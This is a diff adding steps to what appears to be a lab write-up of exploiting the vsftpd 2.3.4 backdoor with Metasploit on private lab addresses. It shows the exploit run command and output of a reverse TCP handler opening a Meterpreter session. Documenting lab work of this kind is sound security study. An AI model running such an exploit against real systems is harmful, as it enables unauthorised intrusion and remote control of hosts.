@@ -271,3 +271,20 @@ RHOSTS => 192.168.5.139
 <p align="center">
   <img src="images/step4-4.png" width="600">
 </p>
+
+### Ran the Exploit
+
+```bash
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+```
+
+## Step 5 — Getting a Root Shell
+
+**Output:**
+```
+[*] Started reverse TCP handler on 192.168.5.128:4444 
+[+] 192.168.5.145:21 - Backdoor has been spawned!
+[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.145:42041) at 2026-07-06 12:20:23 -0400
+
+meterpreter > 
+```
